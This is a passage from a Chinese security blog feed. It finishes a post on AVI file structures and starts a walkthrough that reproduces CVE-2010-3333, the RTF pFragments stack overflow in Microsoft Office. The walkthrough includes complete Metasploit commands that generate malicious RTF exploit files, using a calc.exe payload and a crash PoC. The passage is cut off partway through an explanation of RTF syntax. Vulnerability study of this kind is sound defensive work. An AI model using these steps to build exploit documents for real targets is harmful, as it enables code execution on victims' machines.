style="text-align:left">说明将颜色放置在系统调色板中的未使用条目中，而不是与系统调色板中的现有颜色匹配的条目中。如果系统调色板中没有未使用的条目，则颜色将正常匹配。一旦此颜色出现在系统调色板中，其他逻辑调色板中的颜色就可以与此颜色匹配。</td></tr><tr><td style="text-align:left">PC_RESERVED</td><td style="text-align:left">说明将逻辑调色板条目用于调色板动画。该标志可防止其他窗口将颜色与调色板条目匹配，因为颜色经常变化。如果有未使用的系统调色板条目可用，则将颜色放置在该条目中。否则，该颜色不可用于动画。</td></tr></tbody></table><p>&emsp;&emsp;<strong><code>LOGPALETTE</code></strong>结构定义了一个<code>逻辑调色板</code>。</p><blockquote><ul><li><strong><code>palVersion</code></strong>: 系统的<code>版本号</code>。</li><li><strong><code>palNumEntries</code></strong>: 逻辑面板中<code>条目的数量</code>。</li><li><strong><code>palPalEntry</code></strong>: 指定一组<code>PALETTEENTRY</code>结构，这些结构定义<code>逻辑调色板</code>中每个条目的<code>颜色</code>和<code>用法</code>。</li></ul></blockquote><p>&emsp;&emsp;<code>调色板条目表</code>中的颜色应按<code>重要性顺序</code>显示，因为<code>逻辑调色板</code>中<code>较前的条目</code>最有可能放置在<code>系统调色板</code>中。</p><h3 id="2-5、idx1-Chunk"><a href="#2-5、idx1-Chunk" class="headerlink" title="2.5、idx1 Chunk"></a>2.5、idx1 Chunk</h3><h4 id="2-5-1、AVI-1-0-index"><a href="#2-5-1、AVI-1-0-index" class="headerlink" title="2.5.1、AVI 1.0 index"></a>2.5.1、AVI 1.0 index</h4><p>&emsp;&emsp;<strong><code>可选索引块(“idx1”)</code></strong>可以位于<code>“movi”</code>列表之后。<code>索引</code>包含数据块及其<code>在文件中的位置</code>的<code>列表</code>。它由一个<strong><code>AVIOLDINDEX</code></strong>结构组成，该结构具有<code>每个数据块</code>的条目(包括<code>“rec”块</code>)。如果文件<code>包含索引</code>，请在<code>AVIMAINHEADER</code>结构的<code>dwFlags</code>成员中设置<code>AVIF_HASINDEX</code>标志。</p><p>&emsp;&emsp;<code>AVIOLDINDEX</code>结构由<code>初始RIFF块</code>(Chunk结构体:fcc和cb成员)和<code>“movi”</code>列表中<code>每个数据块</code>的一个<code>索引条目</code>组成。<strong><code>AVIOLDINDEX</code></strong>结构体的定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">avioldindex</span> &#123;</span></span><br><span class="line">    FOURCC  fcc;</span><br><span class="line">    DWORD   cb;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        DWORD dwChunkId;</span><br><span class="line">        DWORD dwFlags;</span><br><span class="line">        DWORD dwOffset;</span><br><span class="line">        DWORD dwSize;</span><br><span class="line">    &#125; _avioldindex_entry;</span><br><span class="line">    _avioldindex_entry aIndex[];</span><br><span class="line">&#125; AVIOLDINDEX;</span><br></pre></td></tr></table></figure><blockquote><ul><li><strong><code>fcc</code></strong>: 指定<code>FourCC</code>代码。必须为<code>“idx1”</code>。</li><li><strong><code>cb</code></strong>: 指定<code>本结构体的大小</code>，与<code>Chunk</code>结构体中的<code>dwSize</code>相同。不包括初始的<code>8个字节</code>(fcc和cb)。</li><li><strong><code>aIndex</code></strong>: 包含下列成员的结构体的数组。<ul><li><strong><code>dwChunkId</code></strong>: 指定用于标识AVI文件中<code>流的FourCC</code>。<code>FourCC</code>的格式必须为<code>“xxyy”</code>，其中<code>xx</code>是<code>流编号</code>，而<code>yy</code>是两个字符的代码，用于标识<code>流的内容</code>。请看前面介绍<code>“movi List”</code>时的内容。</li><li><strong><code>dwFlags</code></strong>: 请看下文。</li><li><strong><code>dwOffset</code></strong>: 指定数据块<code>在文件中的位置</code>。该值应指定为距<code>“movi”列表开头</code>的<code>偏移量</code>(以<code>字节</code>为单位)；但是，在某些AVI文件中，它是距<code>文件开头</code>的<code>偏移量</code>。<code>AVI文件解析器</code>必须能够处理<code>两个版本</code>。</li><li><strong><code>dwSize</code></strong>: 指定<code>数据块的大小</code>，以<code>字节</code>为单位。</li></ul></li></ul></blockquote><p>&emsp;&emsp;<strong><code>dwFlags</code></strong>指定以下标志的<code>0个</code>或<code>多个</code>的<code>按位组合</code>:</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:left">Meaning</th></tr></thead><tbody><tr><td style="text-align:left">AVIIF_KEYFRAME</td><td style="text-align:left">此条目所指的数据块是关键帧。</td></tr><tr><td style="text-align:left">AVIIF_LIST</td><td style="text-align:left">此条目所指的数据块是一个“rec”列表。不是一个Chunk。</td></tr><tr><td style="text-align:left">AVIIF_FIRSTPART</td><td style="text-align:left">此条目所指的数据块需要使用其后的帧；它不能单独存在。</td></tr><tr><td style="text-align:left">AVIIF_LASTPART</td><td style="text-align:left">此条目所指的数据块需要使用其之前的帧；它不能单独存在。</td></tr><tr><td style="text-align:left">AVIIF_NO_TIME</td><td style="text-align:left">此条目所指的数据块不影响流的计时。例如，应该为调色板更换数据块(“..pc”)设置这个标志。</td></tr></tbody></table><p>&emsp;&emsp;如果既未设置<code>AVIIF_FIRSTPART</code>也未设置<code>AVIIF_LASTPART</code>，则该块可以<code>单独使用</code>，换句话说，其相应的流<code>至少有一个数据包</code>。这对于将<code>VBR音频流</code>存储在AVI文件中非常重要。</p><p>&emsp;&emsp;<strong><code>“idx1 Chunk”</code></strong>的标准形式示意图：</p><div align="left"><img src="/resources/2020/AVI_Format/idx1 Chunk.png" width="70%" height="50%" alt="idx1 Chunk标准形式"></div><h4 id="2-5-2、AVI-2-0-index-Open-DML"><a href="#2-5-2、AVI-2-0-index-Open-DML" class="headerlink" title="2.5.2、AVI 2.0 index(Open-DML)"></a>2.5.2、AVI 2.0 index(Open-DML)</h4><p>&emsp;&emsp;<strong><code>AVI2.0索引</code></strong>可以显示为<code>单个块(“idx1”)</code>。或者，可以在<code>“movi”</code>块中插入<code>索引段(“ix..”)</code>。如果将<code>索引段(“ix..”)</code>放置在<code>“movi”</code>块中，则<code>超级索引</code>(“Super Index Chunk”或“indx Chunk”)包含<code>索引段(“ix..”)的索引</code>。<code>AVIMETAINDEX</code>结构是<code>索引段(“ix..”)</code>和<code>超级索引(“indx”)</code>的基础结构。</p><p>&emsp;&emsp;<code>AVIMETAINDEX</code>结构体是<code>AVI2.0索引</code>的基本结构(<code>“indx”</code>格式)。<strong><code>AVIMETAINDEX</code></strong>结构体的定义如下(可参考<code>“indx Chunk”</code>节)：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">avimetaindex</span> &#123;</span></span><br><span class="line">    FOURCC fcc;</span><br><span class="line">    UINT   cb;</span><br><span class="line">    WORD   wLongsPerEntry;</span><br><span class="line">    BYTE   bIndexSubType;</span><br><span class="line">    BYTE   bIndexType;</span><br><span class="line">    DWORD  nEntriesInUse;</span><br><span class="line">    DWORD  dwChunkId;</span><br><span class="line">    DWORD  dwReserved[<span class="number">3</span>];</span><br><span class="line">    DWORD  adwIndex[];</span><br><span class="line">&#125; AVIMETAINDEX;</span><br></pre></td></tr></table></figure><blockquote><ul><li><strong><code>fcc</code></strong>: <code>FourCC</code>代码。取值为<code>“indx”</code>或<code>“ix..”</code>，其中<code>“..”</code>是<code>流编号</code>。</li><li><strong><code>cb</code></strong>: 指示<code>此结构体的大小</code>，不包括初始的<code>8个字节</code>(fcc和cb)。</li><li><strong><code>wLongsPerEntry</code></strong>: 每个<code>索引项的大小</code>，以<code>4字节</code>为单位。</li><li><strong><code>bIndexSubType</code></strong>: <code>索引子类型</code>。含义取决于<code>bIndexType</code>的值。</li><li><strong><code>bIndexType</code></strong>: 请看下文。</li><li><strong><code>nEntriesInUse</code></strong>: adwIndex数组中<code>有效的条目数</code>。</li><li><strong><code>dwChunkId</code></strong>: 标识<code>被索引</code>的对象的<code>FourCC</code>。如果<code>索引的对象</code>是一个<code>流</code>，则该成员与<code>AVIOLDINDEX</code>结构的<code>dwChunkId</code>成员具有<code>相同的含义</code>。</li><li><strong><code>dwReserved</code></strong>: 该成员的含义取决于<code>索引类型</code>。</li><li><strong><code>adwIndex</code></strong>: <code>索引项的数组</code>。该数据的格式取决于<code>索引类型</code>。</li></ul></blockquote><p>&emsp;&emsp;<strong><code>bIndexType</code></strong>可以具有以下值：</p><table><thead><tr><th style="text-align:left">Value</th><th style="text-align:left">Meaning</th></tr></thead><tbody><tr><td style="text-align:left">AVI_INDEX_OF_INDEXES <br> 0x00</td><td style="text-align:left">每个索引条目都指向另一个索引。将AVIMETAINDEX结构视为AVISUPERINDEX结构。bIndexSubType的值必须为0。</td></tr><tr><td style="text-align:left">AVI_INDEX_OF_CHUNKS <br> 0x01</td><td style="text-align:left">每个索引条目指向文件中的一个数据块。<br> 1、如果bIndexSubType为0，将AVIMETAINDEX结构视为AVISTDINDEX结构。每个索引条目都是一个AVISTDINDEX_ENTRY结构。<br> 2、如果bIndexSubType为AVI_INDEX_SUB_2FIELD，则该索引是一个域索引块(Field Index)。<br> DirectShow不支持域索引(Field Index)。</td></tr><tr><td style="text-align:left">AVI_INDEX_IS_DATA <br> 0x80</td><td style="text-align:left">adwIndex数组包含一个数据表，而不是一个索引项列表。</td></tr></tbody></table><h3 id="2-6、JUNK-Chunk"><a href="#2-6、JUNK-Chunk" class="headerlink" title="2.6、JUNK Chunk"></a>2.6、JUNK Chunk</h3><p>&emsp;&emsp;根据需要插入<strong><code>“JUNK”</code></strong>块，可以在AVI文件中<code>对齐数据</code>。应用程序应<code>忽略“JUNK”块</code>的内容。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote><ul><li>1.<a href="https://cdn.hackaday.io/files/274271173436768/avi.pdf" target="_blank" rel="noopener">PDF - AVI File Format Documentation v1.0</a></li><li>2.<a href="https://web.archive.org/web/20070112225112/http://www.the-labs.com/Video/odmlff2-avidef.pdf" target="_blank" rel="noopener">PDF - OpenDML AVI File Format Extensions v1.02</a></li><li>3.<a href="https://docs.microsoft.com/zh-cn/windows/win32/directshow/avi-file-format" target="_blank" rel="noopener">Microsoft - AVI File Format</a></li><li>4.<a href="https://en.wikipedia.org/wiki/Audio_Video_Interleave" target="_blank" rel="noopener">WikiPedia - Audio Video Interleave</a></li><li>5.<a href="https://baike.baidu.com/item/RIFF/20811305" target="_blank" rel="noopener">riff(WINDOWS文件格式)</a></li><li>6.<a href="https://blog.csdn.net/chenyonken/article/details/79174500" target="_blank" rel="noopener">CSDN - AVI文件格式详解</a></li><li>7.<a href="https://blog.jianchihu.net/avi-file-parse.html" target="_blank" rel="noopener">剑痴乎 - AVI文件详细解析</a></li><li>8.<a href="https://zhuanlan.zhihu.com/p/162679898" target="_blank" rel="noopener">知乎 - 音视频编解码–AVI格式</a></li><li>9.<a href="https://www.cnblogs.com/wangguchangqing/p/5957531.html" target="_blank" rel="noopener">RIFF和WAVE音频文件格式</a></li></ul></blockquote>]]></content>
      
      <categories>
          
          <category> FileFormat </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CVE-2010-3333复现与分析</title>
      <link href="/2020/12/20/CVE-2010-3333%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
      <url>/2020/12/20/CVE-2010-3333%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<blockquote><p>这个漏洞还是《漏洞战争》中的例子，学东西还是要脚踏实地，一步一步学习。<br>而且要每天给自己定个目标，尽自己最大的努力去完成，不要拖拉。<br>我发现自己有拖延症，要努力地去改掉这个坏习惯了。<br>废话不多说，尽自己最大努力，将《漏洞战争》中的漏洞都亲手调一遍，我相信可以学到很多东西。<br><a id="more"></a></p></blockquote><h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>&emsp;&emsp;<code>Microsoft Office</code>是微软发布的非常流行的<code>办公软件套件</code>。<code>CVE-2010-3333</code>(<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2010/ms10-087" target="_blank" rel="noopener">微软编号：MS10-087</a>)是Microsoft<code>Office XP SP3</code>、<code>Office 2003 SP3</code>、<code>Office 2007 SP2</code>、<code>Office 2010</code>，Mac<code>Office 2004</code>和<code>Office 2008</code>，Mac<code>Office 2011</code>和Mac的<code>Open XML文件格式转换器</code>中的<code>栈溢出漏洞</code>。主要是在处理<code>RTF</code>中的<code>“pFragments”属性</code>时存在栈溢出，导致攻击者可以借助<code>特制的RTF数据</code>执行<code>任意代码</code>，因此该漏洞又名<code>“RTF栈缓冲区溢出漏洞”</code>。</p><h2 id="0x10-分析环境"><a href="#0x10-分析环境" class="headerlink" title="0x10 分析环境"></a>0x10 分析环境</h2><table><thead><tr><th style="text-align:center"></th><th style="text-align:left">使用的环境</th><th style="text-align:left">备注</th></tr></thead><tbody><tr><td style="text-align:center">操作系统</td><td style="text-align:left">Windows XP <br> Windows 7</td><td style="text-align:left">版本号:Windows XP Professional SP3 简体中文版 <br> 版本号:Windows 7 Enterprise SP0 x86 简体中文版</td></tr><tr><td style="text-align:center">虚拟机</td><td style="text-align:left">VMWare Workstations</td><td style="text-align:left">版本号:15.5.1</td></tr><tr><td style="text-align:center">调试器</td><td style="text-align:left">吾爱OllyDbg <br> WinDbg <br> Immunity Debugger</td><td style="text-align:left">版本号:2016版 <br> 版本号:v6.12(x86) <br> 版本号:v1.85</td></tr><tr><td style="text-align:center">反汇编器</td><td style="text-align:left">IDA Pro</td><td style="text-align:left">版本号:7.0</td></tr><tr><td style="text-align:center">漏洞软件</td><td style="text-align:left">Microsoft Office Word</td><td style="text-align:left">版本号1:Microsoft Office Professional 2003 SP3(11.8169.8172) <br> 版本号2:Microsoft Office Professional 2007 SP0(12.0.4518.1014)</td></tr></tbody></table><h2 id="0x20-漏洞复现"><a href="#0x20-漏洞复现" class="headerlink" title="0x20 漏洞复现"></a>0x20 漏洞复现</h2><p>这里用<code>msf</code>来生成用于漏洞利用的<code>exploit样本</code>文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">1、Microsoft Office 2003 SP3 English on Windows XP SP3 English</span><br><span class="line">msf &gt; search cve-2010-3333</span><br><span class="line">msf &gt; use exploit/windows/fileformat/ms10_087_rtf_pfragments_bof</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> target 2</span><br><span class="line">target =&gt; 2</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> FILENAME CVE-2010-3333(target2,calc).rtf</span><br><span class="line">FILENAME =&gt; CVE-2010-3333(target2,calc).rtf</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> payload windows/<span class="built_in">exec</span> </span><br><span class="line">payload =&gt; windows/<span class="built_in">exec</span></span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> CMD calc.exe</span><br><span class="line">CMD =&gt; calc.exe</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; exploit</span><br><span class="line">[*] Creating <span class="string">'CVE-2010-3333(target2,calc).rtf'</span> file ...</span><br><span class="line">[+] CVE-2010-3333(target2,calc).rtf stored at /root/.msf4/<span class="built_in">local</span>/CVE-2010-3333(target2,calc).rtf</span><br><span class="line"></span><br><span class="line">2、Microsoft Office 2007 SP0 English on Windows 7 SP0 English</span><br><span class="line">msf &gt; search cve-2010-3333</span><br><span class="line">msf &gt; use exploit/windows/fileformat/ms10_087_rtf_pfragments_bof</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> target 5</span><br><span class="line">target =&gt; 2</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> FILENAME CVE-2010-3333(target5,calc).rtf</span><br><span class="line">FILENAME =&gt; CVE-2010-3333(target5,calc).rtf</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> payload windows/<span class="built_in">exec</span> </span><br><span class="line">payload =&gt; windows/<span class="built_in">exec</span></span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> CMD calc.exe</span><br><span class="line">CMD =&gt; calc.exe</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; exploit</span><br><span class="line">[*] Creating <span class="string">'CVE-2010-3333(target5,calc).rtf'</span> file ...</span><br><span class="line">[+] CVE-2010-3333(target5,calc).rtf stored at /root/.msf4/<span class="built_in">local</span>/CVE-2010-3333(target5,calc).rtf</span><br><span class="line"></span><br><span class="line">3、PoC(Crash)</span><br><span class="line">msf &gt; search cve-2010-3333</span><br><span class="line">msf &gt; use exploit/windows/fileformat/ms10_087_rtf_pfragments_bof</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> FILENAME CVE-2010-3333(target6,Crash).rtf</span><br><span class="line">FILENAME =&gt; CVE-2010-3333(target6,Crash).rtf</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; <span class="built_in">set</span> target 6</span><br><span class="line">target =&gt; 6</span><br><span class="line">msf exploit(windows/fileformat/ms10_087_rtf_pfragments_bof) &gt; exploit</span><br><span class="line">[*] Creating <span class="string">'CVE-2010-3333(target6,Crash).rtf'</span> file ...</span><br><span class="line">[+] CVE-2010-3333(target6,Crash).rtf stored at /root/.msf4/<span class="built_in">local</span>/CVE-2010-3333(target6,Crash).rtf</span><br></pre></td></tr></table></figure><h2 id="0x30-漏洞原理分析"><a href="#0x30-漏洞原理分析" class="headerlink" title="0x30 漏洞原理分析"></a>0x30 漏洞原理分析</h2><h3 id="0x31-RTF文件格式"><a href="#0x31-RTF文件格式" class="headerlink" title="0x31 RTF文件格式"></a>0x31 RTF文件格式</h3><h4 id="1、RTF简介"><a href="#1、RTF简介" class="headerlink" title="1、RTF简介"></a>1、RTF简介</h4><p>&emsp;&emsp;<code>RTF</code>(Rich Text Format)是<code>Microsoft公司</code>为进行<code>文本</code>和<code>图像</code>信息格式的<code>交换</code>而指定的一种<code>文件格式</code>，它适用与不同的<code>设备</code>、<code>操作环境</code>和<code>操作系统</code>。大多数<code>文字处理软件</code>都可以读写<code>某些版本的RTF</code>。</p><h4 id="2、RTF的组成"><a href="#2、RTF的组成" class="headerlink" title="2、RTF的组成"></a>2、RTF的组成</h4><h5 id="2-1、RTF的基本元素"><a href="#2-1、RTF的基本元素" class="headerlink" title="2.1、RTF的基本元素"></a>2.1、RTF的基本元素</h5><p>&emsp;&emsp;<code>标准RTF文件</code>只能包含<code>7位ASCII字符</code>，但可以通过<code>转义序列</code>对<code>超出ASCII范围</code>的字符进行编码。由<code>控制字</code>(Control Word)、<code>控制符</code>(Control Symbol)和<code>群组</code>(Group)组成。由于RTF由<code>7位ASCII字符</code>组成，所以可以在大多数<code>基于PC的操作系统</code>之间轻松传输。与大多数<code>明文文件</code>不同，RTF文件<code>不必</code>包含任何<code>回车/换行符</code>(CRLFs)，RTF解析软件应<code>忽略CRLF</code>,除非他们可以用作<code>控制字分隔符</code>。当<code>CRLF</code>出现在<code>主要组</code>边界时，RTF文件<code>更具可读性</code>。</p><p><strong><code>1、控制字(Control Word)</code></strong><br>&emsp;&emsp;<code>控制字</code>是RTF用来<code>标记打印控制符</code>和<code>管理文档信息</code>的一种特殊格式的命令，<code>RTF</code>用它作为<code>正文格式</code>的<code>控制代码</code>，每个控制字均以一个<code>反斜杠\</code>开头，并且控制字<code>区分大小写</code>。<code>ASCII字母序列</code>由ASCII字母字符<code>(a~z和A~Z)</code>组成，<code>控制字</code>(也称为关键字)最初应该不包含<code>任何大写字母</code>，但是近年来，大写字母出现在一些<code>较新的的控制字</code>中，<code>控制字的名称</code>不能超过<code>32个字母</code>，而<code>分隔符</code>标志着<code>控制字名称</code>的结束。其格式为<code>“\ASCII字母序列&lt;分隔符&gt;”</code>。</p><p><code>&lt;分隔符&gt;</code>可以使以下之一：</p><blockquote><ul><li><code>一个空格</code>。这仅用于分隔控制字，在后续处理中将被忽略。</li><li><code>一个数字或者ASCII减号(-)</code>，表示数字参数与控制字关联。随后的数字序列由ASCII数字(通常是以反斜杠开头的另一个控制字)以外的任何字符分隔。参数可以是正数或负数。该数字的值范围名义上为–32768至32767，即带符号的16位整数。少数控制字的取值范围是-2,147,483,648到2,147,483,647，即32位带符号整数。这些控制字包括\binN，\revdttmN，\rsidN相关的控制字以及一些图片属性，例如\bliptagN。这里N代表数字参数。 RTF解析器必须允许最多10位数字，并可选地在前面加上减号。如果定界符是空格，则将其丢弃，也就是说，它不会包含在后续处理中。</li><li><code>除字母或数字外的任何字符</code>。在这种情况下，分隔符终止控制字，而不是控制字的一部分。例如反斜杠“\”，表示后面跟着新的控制字或控制符。</li></ul></blockquote><p>&emsp;&emsp;如果用<code>单个空格</code>分隔控制字，则<code>该空格</code>不会出现在<code>文档</code>中(将<code>被忽略</code>)。<code>单个空格</code>分隔符后面的<code>任何字符</code>，包括<code>任何后续空格</code>，将在<code>文档</code>中显示为<code>文本</code>或<code>空格</code>。因此，应仅在<code>必要时</code>使用<code>空格</code>。建议<code>避免使用空格</code>作为<code>分隔RTF语法</code>的一种方法，以使其<code>更易于阅读</code>。您可以使用<code>段落标记</code>(CR，LF或CRLF)来<code>分隔行</code>，而无需更改含义，但包含<code>\binN</code>的<code>目的地</code>除外。</p><p>&emsp;&emsp;在此文档中，采用<code>数字参数N</code>的<code>控制字</code>是用<code>N</code>来写的，如<code>\binN</code>所示，除非<code>控制字</code>以<code>显式值</code>出现。唯一的例外是<code>\b</code>(粗体切换)之类的<code>“切换”控制字</code>，它只有<code>两种状态</code>。当此类控制字<code>没有参数</code>或具有<code>非零参数</code>时，控制字将<code>打开属性</code>。当此类控制字的<code>参数为0</code>时，控制字将<code>关闭该属性</code>。例如，<code>\b</code>打开粗体，<code>\b0</code>关闭粗体。在这些<code>切换控制字</code>的定义中，<code>控制字名称</code>后跟一个<code>星号“*”</code>。</p><p><strong><code>2、单位(Units)</code></strong><br>&emsp;&emsp;<code>参数N</code>通常指定<code>尺寸</code>。 RTF中用于<code>尺寸的单位</code>可以是<code>点(pts)</code>，<code>half pts</code>，<code>twips</code>，<code>Device-independent</code>字单位，<code>EMU</code>或<code>像素(pixels)</code>，具体取决于<code>控制字</code>。这些单位汇总在下表中：</p><table><thead><tr><th style="text-align:left">Units</th><th style="text-align:left">Conversions</th></tr></thead><tbody><tr><td style="text-align:left">Points(pts)</td><td style="text-align:left">72/inch</td></tr><tr><td style="text-align:left">Half points</td><td style="text-align:left">144/inch</td></tr><tr><td style="text-align:left">Twips</td><td style="text-align:left">1440/inch, 20/pt</td></tr><tr><td style="text-align:left">Device-independent</td><td style="text-align:left">294912/inch, 4096/pt</td></tr><tr><td style="text-align:left">EMUs</td><td style="text-align:left">914400/inch, 36000/mm, 12700/pt, 635/twip</td></tr><tr><td style="text-align:left">Pixels</td><td style="text-align:left">typically 96/inch</td></tr></tbody></table><p>&emsp;&emsp;<code>EMU(英制单位)</code>用于某些<code>图形参数尺寸</code>(请参见<code>\shp</code>)，<code>像素(Pixels)</code>用于某些<code>位图</code>和<code>图元文件</code>(metafile)尺寸。<code>EMU</code>的精确度为<code>英寸(inch)</code>，<code>毫米(mm)</code>，<code>点(pts)</code>和<code>twips</code>。 RTF中<code>最常用的单位</code>是<code>twips</code>。</p><p><strong><code>3、控制符(Control Symbol)</code></strong><br>&emsp;&emsp;<code>控制符</code>由<code>反斜杠</code>和一个<code>非字母字符</code>组成。例如，<code>\〜</code>(反斜杠波浪线)表示一个<code>不间断的空格</code>。控制符<code>没有分隔符</code>，即<code>控制符</code>后面的<code>空格</code>被视为<code>文本</code>，而不是<code>分隔符</code>。</p><p><strong><code>4、组(Group)</code></strong><br>&emsp;&emsp;<code>一个组</code>可以由包含在<code>大括号({})</code>内的<code>文本</code>，<code>控制字</code>或<code>控制符</code>组成。<code>左括号({)</code>表示组的开始，<code>右括号(})</code>表示组的结束。<code>每个组</code>指定<code>受组影响的文本</code>以及<code>该文本的不同属性</code>。RTF文件还可以包括<code>字体</code>、<code>样式</code>、<code>屏幕颜色</code>、<code>图片</code>、<code>脚注</code>、<code>注释</code>、<code>页眉</code>和<code>页脚</code>、<code>摘要信息</code>、<code>域</code>、<code>书签</code>，以及文档、区段、段落和<code>字符格式属性</code>，<code>数学运算</code>、<code>图像</code>和<code>对象</code>的组。如果文件中包含<code>字体</code>，<code>文件</code>，<code>样式</code>，<code>颜色</code>，<code>修订标记</code>和<code>摘要信息组</code>以及<code>文档格式属性</code>，则它们必须出现在<code>RTF正文</code>之前的<code>RTF头</code>中。如果<code>未使用</code>任何组的内容，则可以<code>省略该组</code>。以下各节讨论了这些组。使用<code>另一个组中定义的属性</code>的任何组都必须出现在<code>定义这些属性的组</code>之后。例如，<code>颜色和字体属性</code>必须在<code>样式组</code>之前。</p><p><strong><code>5、目的地(Destinations)</code></strong><br>&emsp;&emsp;某些<code>控制字</code>(称为<code>目的地</code>)标记了<code>相关文本集合</code>的开始，这些文本可能出现在<code>文档中的另一个位置</code>或<code>目的地</code>。<code>目的地位置</code>也可能包含<code>已使用</code>但根本<code>没有出现在文档中</code>的文本。目的地的<code>示例</code>是<code>\footnote组</code>，其中<code>脚注文本</code>在<code>控制字</code>之后。<code>分页符</code>不能出现在<code>目的地文本</code>中。目的地<code>控制字</code>及其<code>相关文本</code>必须用<code>大括号({})</code>括起来。</p><p>&emsp;&emsp;在<code>1987 RTF规范</code>之后添加的<code>目的地</code>，可以带有<code>控制符\*</code>(反斜杠星号)。如果<code>RTF阅读器</code>无法识别<code>目的地控制字</code>，则此<code>控制符</code>标识的<code>目的地</code>相关文本应<code>被忽略</code>。添加新的<code>目的地</code>或<code>组</code>时，<code>RTF编写者</code>应遵循使用<code>此控制符</code>的约定。即使<code>RTF阅读器</code>无法识别<code>目的地</code>，其相关文本也应<code>插入文档中</code>，而<code>目的地</code>不应使用<code>\*</code>。</p><p>&emsp;&emsp;<code>组</code>中指定的<code>大多数格式</code>仅影响<code>该组中的文本</code>(包括该组中的<code>嵌套组</code>)。通常，<code>组中的文本</code>会继承<code>外部组中的文本</code>的格式。但是，RTF的Microsoft实现假定<code>脚注</code>，<code>注释</code>，<code>页眉</code>和<code>页脚组</code>(在本规范的后面部分介绍)不继承<code>外部组的格式</code>。因此，为确保<code>正确格式化</code>这些组，应使用<code>\sectd</code>，<code>\pard</code>和<code>\plain</code>控制字将这些<code>组内的格式</code>设置为<code>适当的默认值</code>，然后添加<code>所需的格式</code>。</p><p>&emsp;&emsp;<code>控制字</code>，<code>控制符</code>和<code>花括号</code>构成<code>控制信息</code>。文件中的所有<code>其他字符</code>均为<code>纯文本</code>或<code>数据</code>。这是一个示例，其中包含<code>内部组</code>中不存在的<code>纯文本</code>：</p><blockquote><p>{\rtf1\ansi\deff0<br>{<strong>\fonttbl</strong>{\f0\froman Tms Rmn;}{\f1\fdecor Symbol;}{\f2\fswiss Helv;}}<br>{<strong>\colortbl</strong>;\red0\green0\blue0;\red0\green0\blue255;\red0\green255\blue255;\red0\green255\blue0;\red255\green0\blue255;\red255\green0\blue0;\red255\green255\blue0;\red255\green255\blue255;}<br>{<strong>\stylesheet</strong>{\fs20 \snext0 Normal;}}<br>{<strong>\info</strong>{\author John Doe}{\creatim\yr1990\mo7\dy30\hr10\min48}{\version1}{\edmins0}{\nofpages1}{\nofwords0}{\nofchars0}{\vern8351}}<br>\widoctrl\ftnbj \sectd\linex0\endnhere <strong>\pard</strong>\plain \fs20 <strong>This is plain text.</strong>\par}</p></blockquote><p>&emsp;&emsp;即使<code>“This is plain text.”</code>不是<code>内部组</code>的一部分，它包含在<code>{\rtf1 